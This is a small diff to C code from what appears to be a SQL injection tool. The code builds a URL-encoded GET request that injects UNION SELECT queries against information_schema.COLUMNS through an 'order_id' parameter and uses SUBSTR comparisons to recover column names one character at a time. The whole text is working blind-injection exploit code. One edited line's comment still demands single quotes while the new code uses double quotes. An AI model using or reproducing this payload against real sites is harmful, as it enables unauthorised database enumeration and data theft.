@@ -258,8 +258,8 @@ bool check_column(const void *ctx) {
     const char *fmt =
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20column_name%%20"
         "FROM%%20information_schema.COLUMNS%%20"
-        //"WHERE%%20table_name%%3d%%27%s%%27%%20" // %s = table_name (Literal! Must use %27 single quotes)
-        "WHERE%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find (Literal)
+        "WHERE%%20table_name%%3d%%22%s%%22%%20" // %s = table_name (Literal! Must use %27 single quotes)
+        "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find (Literal)
         "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered (Literal)
         "AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20"
         "LIMIT%%201;"
